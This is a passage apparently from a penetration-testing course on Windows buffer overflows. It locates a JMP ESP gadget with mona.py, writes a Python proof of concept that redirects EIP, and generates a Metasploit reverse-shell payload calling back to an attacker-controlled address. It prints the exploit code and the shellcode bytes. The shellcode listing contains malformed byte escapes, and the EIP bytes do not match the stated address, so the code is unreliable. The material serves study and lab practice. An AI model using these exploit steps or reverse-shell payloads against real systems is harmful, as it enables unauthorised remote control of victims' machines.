
Searching through the output, we find that **LIBSSP.DLL** also suits our needs and the address range doesn’t seem to contain bad characters. This is perfect for our needs. Now we need to find the address of a naturally-occurring JMP ESP instruction within this module.

> *Advanced tip: If this application was compiled with DEP support, our JMP ESP address would have to be located in the text code segment of the module, as that is the only segment with both Read (R) and Executable (E) permissions. However, since DEP is not enabled, we are free to use instructions from any address in this module.*

We could use native commands within the Immunity Debugger to search for our JMP ESP instruction, but the search would have to be performed on multiple data areas inside the DLL. Instead, we can use *mona.py* to perform an exhaustive search for the binary or hexadecimal representation (or opcode) of the assembly instruction.

To find the opcode equivalent of JMP ESP, we can use the Metasploit NASM Shell ruby script, **msf-nasm\_shell**, which produces the results shown in Listing 357:

```
kali@kali:~$ msf-nasm\_shell
nasm > jmp\ esp
00000000 FFE4             jmp\ esp
nasm >
```

*Listing 357 - Finding the opcode of JMP ESP*

We can search for JMP ESP using the hex representation of the opcode (0x**FFE4**) in all sections of **LIBSSP.DLL** with *mona.py find*.

We will specify the content of the search with **-s** and the escaped value of the opcode’s hex string, **“\xff\xe4”**.

Additionally, we provide the name of the required module with the **-m** option.

The output of the final command, `!mona find -s “\xff\xe4” -m “libssp.dll”`, is shown in Figure 218:

![](img/ec25e59d75726b7041242a56d3376832_387_0.png)

*Figure 218: Search for opcodes using mona.py*

In this example, the output reveals one address containing a JMP ESP instruction (0x**10090c83**), and fortunately, the address does not contain any of our bad characters.

To view the contents of 0x10090c83 in the disassembler window, while execution is paused, we will click the "Go to address in Disassembler" button (Figure 219) and enter the address. From here we can see that it does indeed translate to a JMP ESP instruction.

![](img/ec25e59d75726b7041242a56d3376832_388_0.png)

If we redirect EIP to this address at the time of the crash, the JMP ESP instruction will be executed, which will lead the execution flow into our shellcode.

We can test this by updating the eip variable to reflect this address in our proof of concept:

```python
...
filler = "A" * 780
eip = "\xb8\x0c\x09\x10"
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer
...
```

*Listing 358 - Redirecting EIP*

Note that the address entered above is in reverse order. This is because of endianness [320] byte order. The operating system can store addresses and data in memory in different formats. Generally speaking, the format used to store addresses in memory depends on the architecture the operating system is running on. Little endian is currently the most widely-used format and it is used by the x86 and AMD64 architectures, while big endian was historically used by the Sparc and PowerPC architectures. In little endian format the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address. Therefore, we have to store the return address in reverse order in our buffer for the CPU to interpret it correctly in memory.

Using F2 in the debugger, we will place a breakpoint at address 0x10090c83 in order to follow the execution of the JMP ESP instruction, and then we run our exploit again. The result is shown in Figure 220:

[320] (Wikipedia, 2019), http://en.wikipedia.org/wiki/Endianness

![](img/ec25e59d75726b7041242a56d3376832_389_0.png)

*Figure 220: Breakpoint at JMP ESP in LIBSSP.DLL*

Our debugger shows that we did in fact reach our JMP ESP and hit the breakpoint we previously set. Pressing F7 in the debugger will single-step into our shellcode placeholder, which is currently just a bunch of D's.

Great! Now we just need to generate working shellcode and our exploit will be complete.

### 11.2.7.1 Exercises

- 1. Locate the JMP ESP that is usable in the exploit.
- 2. Update your PoC to include the discovered JMP ESP, set a breakpoint on it, and follow the execution to the placeholder shellcode.

### 11.2.8 Generating Shellcode with Metasploit

Writing our own custom shellcode is beyond the scope of this module. However, the Metasploit Framework provides us with tools and utilities that make generating complex payloads a simple task.

MSFvenom [321] is a combination of Msfpayload [322] and Msfencode, [323] putting both of these tools into a single Framework instance. It can generate shellcode payloads and encode them using a variety of different encoders.

> *MSFvenom replaced both msfpayload and msfencode as of June 8th, 2015.*

Currently, the **msfvenom** command can automatically generate over 500 shellcode payload options, as shown in the excerpt below:

```
kali@kali:~$ msfvenom -l payloads

Framework Payloads (546 total) [--payload <value>]
============================================================
```

| Name | Description |
| :----- | :----- |
| aix/ppc/shell_bind_tcp | Listen for a connection and spawn a command shell |
| aix/ppc/shell_find_port | Spawn a shell on an established connection |
| aix/ppc/shell_interact | Simply execve /bin/sh (for inetd programs) |
| aix/ppc/shell_reverse_tcp | Connect back to attacker and spawn a command shell |
| ... | ... |
| windows/shell_reverse_tcp | Connect back to attacker and spawn a command shell |

*Listing 359 - Command to list all Metasploit shellcode payloads*

The msfvenom command is fairly easy-to-use. We will use -p to generate a basic payload called windows/shell_reverse_tcp, which acts much like a Netcat reverse shell. This payload minimally requires an LHOST parameter, which defines the destination IP address for the shell. An optional LPORT parameter specifying the connect-back port may also be defined and we will use the format flag -f to select C-formatted shellcode.

The complete msfvenom command that generates our shellcode is as follows:

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
No platform: Format was selected, choosing Msf::Module::Platform=::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
unsigned char buff[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x78\xc7\xfe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xec3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\xc9\x3a\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xcf\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\xb8\x58\x24\x01\xd3\xe6\x8b"
"\x0c\x4b\x58\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x42\x24"
"\x24\x5b\x58\x61\x56\x58\x53\xff\xf5\xc\x5f\x5a\x8b\x12\xeb"
"\x8b\xd5\x6b\x38\x33\x32\x00\x00\x68\x77\x73\x32\xf5\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x48\x50\x68"
"\x8a\xf8\xd4\xff\x40\x90\xd5\x09\x04\x12\x8e\xf4\x08\x59"
"\xc0\xf0\x03\x89\xd6\xe6\xd1\x89\x48\x55\x9c\xc8\xd9\x04\x12"
"\x20\x59\xc8\xe9\x79\x01\x8f\x9f\xdf\x48\x88\x02\xc2\x04\xff"
"\x44\x86\xe6\x5c\xc8\xd2\x7f\xe8\xf8\xc6\x46\x2a\x46\x6b\x06"
"\x2d\x79\x02\xa8\xbb\x89\x66\x0d\xa4\xc5\xc8\x43\xff\x74\x24"
"\x77\x99\x82\x23\x8c\xf1\xa4\x45\xdd\x6b\xf0\x5b\xc8\x39\x1f"
"\x63\x80\x44\x14\xf1\xa0\xf7\x27\xc1\x57\xc3\x8e\xb5\xc2\x68"
"\x90\xf9\x3b\x8d\xf0\x78\xe8\x9b\x04\x02\x9b\x4a\x29\x5c\xff"
"\xb8\xe5\x83\xa6\xa2\x65\x4d\xc4\xe0\x00\x8b\x84\xa9\x96\x3e"
"\x75\xf7\x9d\x0c\x5f\x46\x3a\xd8\x50\x21\x9d\x72\x87\xc3\x5b"
"\xa1\x24\xe6\xa5\x49\x4a\xbb\x73\xdd\x3b\x59\xa5\x54\x58\x9b\x22"
"\x2f\x20\x28\xe6\x8d\x25\xff\x2b\x1c\x10\x39\xc0\x83\x80\x55\x4d"
"\x25\x60\x4e\x42\xa5\x4d\x84\xa2\xbb\x25\x24\xa8\x5a\x3f\x9f\x06"
"\x8f\xdf\x5b\x59\x44\xa5\x64\x6f\xc7\x2a\x02\xc9\xff\x46\x5b"
"\x56\x6c\x79\xf3\x28\xbb\x2e\x9a\x8b\x35\xc1\x22\x25\x4c\xe5"
```

*Listing 360 - Generate metasploit shellcode*

That seemed simple enough, but if we look carefully we can identify bad characters (such as null bytes) in the generated shellcode.

When we cannot use generic shellcode, we must encode it to suit our target exploitation environment. This could mean transforming our shellcode into a pure alphanumeric payload, getting rid of bad characters, etc.

[321] (Wei Chen, 2014), https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/
[322] (Offensive Security, 2015), https://www.offensive-security.com/metasploit-unleashed/msfpayload/
[323] (Offensive Security, 2015), https://www.offensive-security.com/metasploit-unleashed/msfencode/
